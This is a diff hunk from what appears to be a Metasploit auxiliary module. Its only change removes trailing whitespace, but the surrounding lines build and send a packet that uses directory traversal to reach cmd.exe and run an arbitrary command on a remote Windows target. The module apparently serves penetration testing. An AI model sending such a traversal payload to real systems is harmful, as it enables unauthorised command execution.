@@ -57,7 +57,7 @@ class Metasploit3 < Msf::Auxiliary
 		packet << "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\"
 		packet << "windows\\system32\\cmd.exe\" /c #{exec}"
 		packet << "\x00" * (143 + exec.length)
-		
+
 		print_status("Sending command: #{exec}")
 		sock.put(packet)
 		sock.get_once(-1,0.5)
